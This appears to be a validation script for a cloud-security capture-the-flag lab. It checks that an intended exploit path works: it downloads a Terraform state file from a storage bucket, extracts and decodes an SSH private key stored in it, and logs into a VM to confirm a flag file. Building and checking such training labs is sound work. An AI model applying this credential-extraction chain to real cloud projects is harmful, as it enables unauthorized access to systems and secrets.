#!/bin/bash

set -euo pipefail

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

echo "=========================================="
echo "Module 2 Infrastructure Validation Script"
echo "=========================================="

# Check prerequisites
echo -e "\n${YELLOW}[1/6] Checking prerequisites...${NC}"

if [ -z "${PROJECT_ID:-}" ]; then
    echo -e "${RED}✗ ERROR: PROJECT_ID environment variable not set${NC}"
    echo "Please run: export PROJECT_ID=<your-project-id>"
    exit 1
fi
echo -e "${GREEN}✓ PROJECT_ID is set: $PROJECT_ID${NC}"

# Check for required tools
for tool in gcloud gsutil jq ssh base64; do
    if ! command -v $tool &> /dev/null; then
        echo -e "${RED}✗ ERROR: $tool is not installed${NC}"
        exit 1
    fi
done
echo -e "${GREEN}✓ All required tools are installed${NC}"

# Create temporary directory
TEMP_DIR=$(mktemp -d)
trap "rm -rf $TEMP_DIR" EXIT
echo -e "${GREEN}✓ Created temporary directory: $TEMP_DIR${NC}"

# Check bucket exists and download state file
echo -e "\n${YELLOW}[2/6] Validating storage bucket and state file...${NC}"

BUCKET_NAME="gs://file-uploads-$PROJECT_ID"
STATE_FILE="$TEMP_DIR/terraform.tfstate"

if ! gsutil ls "$BUCKET_NAME" &> /dev/null; then
    echo -e "${RED}✗ ERROR: Bucket $BUCKET_NAME does not exist${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Bucket $BUCKET_NAME exists${NC}"

# Download state file
if ! gsutil cp "$BUCKET_NAME/default.tfstate" "$STATE_FILE" &> /dev/null; then
    echo -e "${RED}✗ ERROR: Failed to download terraform state file${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Downloaded terraform state file${NC}"

# Verify it's valid JSON
if ! jq empty "$STATE_FILE" 2> /dev/null; then
    echo -e "${RED}✗ ERROR: State file is not valid JSON${NC}"
    exit 1
fi
echo -e "${GREEN}✓ State file is valid JSON${NC}"

# Extract SSH key and VM IP from state file
echo -e "\n${YELLOW}[3/6] Extracting exploit components from state file...${NC}"

# Find the SSH secret in the state file
SSH_KEY_B64=$(jq -r '.resources[] | select(.type=="google_secret_manager_secret_version" and .name=="ssh-secret-version-module2") | .instances[0].attributes.secret_data' "$STATE_FILE" 2>/dev/null)

if [ -z "$SSH_KEY_B64" ] || [ "$SSH_KEY_B64" == "null" ]; then
    echo -e "${RED}✗ ERROR: Could not find SSH key in state file${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Found base64-encoded SSH key in state file${NC}"

# Decode SSH key
SSH_KEY_FILE="$TEMP_DIR/ssh_key"
echo "$SSH_KEY_B64" | base64 -d > "$SSH_KEY_FILE"
chmod 600 "$SSH_KEY_FILE"
echo -e "${GREEN}✓ Decoded SSH key and saved with proper permissions${NC}"

# Extract VM external IP
VM_IP=$(jq -r '.resources[] | select(.type=="google_compute_instance" and .name=="compute-instance-module2") | .instances[0].attributes.network_interface[0].access_config[0].nat_ip' "$STATE_FILE" 2>/dev/null)

if [ -z "$VM_IP" ] || [ "$VM_IP" == "null" ]; then
    echo -e "${RED}✗ ERROR: Could not find VM external IP in state file${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Found VM external IP: $VM_IP${NC}"

# Test SSH connectivity
echo -e "\n${YELLOW}[4/6] Testing SSH connectivity...${NC}"

if ! ssh -i "$SSH_KEY_FILE" -o StrictHostKeyChecking=no -o ConnectTimeout=10 alice@$VM_IP "echo 'SSH connection successful'" &> /dev/null; then
    echo -e "${RED}✗ ERROR: Cannot establish SSH connection to alice@$VM_IP${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Successfully connected via SSH as alice@$VM_IP${NC}"

# Verify flag exists
echo -e "\n${YELLOW}[5/6] Verifying challenge components on VM...${NC}"

FLAG_EXISTS=$(ssh -i "$SSH_KEY_FILE" -o StrictHostKeyChecking=no alice@$VM_IP "[ -f /home/alice/flag1.txt ] && echo 'true' || echo 'false'" 2>/dev/null)

if [ "$FLAG_EXISTS" != "true" ]; then
    echo -e "${RED}✗ ERROR: flag1.txt not found in alice's home directory${NC}"
    exit 1
fi
echo -e "${GREEN}✓ flag1.txt exists in /home/alice/${NC}"

# Verify VM service account
SA_EMAIL=$(ssh -i "$SSH_KEY_FILE" -o StrictHostKeyChecking=no alice@$VM_IP "gcloud auth list --filter=status:ACTIVE --format='value(account)'" 2>/dev/null)

if [[ ! "$SA_EMAIL" =~ compute@developer.gserviceaccount.com$ ]]; then
    echo -e "${YELLOW}⚠ WARNING: VM is not using expected compute service account${NC}"
    echo "  Current SA: $SA_EMAIL"
else
    echo -e "${GREEN}✓ VM is using expected compute service account${NC}"
fi

# Verify invoke_monitoring_function.sh exists (for challenge 4)
SCRIPT_EXISTS=$(ssh -i "$SSH_KEY_FILE" -o StrictHostKeyChecking=no alice@$VM_IP "[ -f /home/alice/invoke_monitoring_function.sh ] && echo 'true' || echo 'false'" 2>/dev/null)

if [ "$SCRIPT_EXISTS" != "true" ]; then
    echo -e "${YELLOW}⚠ WARNING: invoke_monitoring_function.sh not found (needed for challenge 4)${NC}"
else
    echo -e "${GREEN}✓ invoke_monitoring_function.sh exists (ready for challenge 4)${NC}"
fi

# Summary
echo -e "\n${YELLOW}[6/6] Validation Summary${NC}"
echo "=========================================="
echo -e "${GREEN}✓ Module 2 infrastructure is properly configured${NC}"
echo -e "${GREEN}✓ Exploit path is functional:${NC}"
echo "  1. Terraform state file accessible in bucket"
echo "  2. SSH key successfully extracted and decoded"
echo "  3. VM accessible via SSH as alice@$VM_IP"
echo "  4. Challenge flag present on VM"
echo "=========================================="

exit 0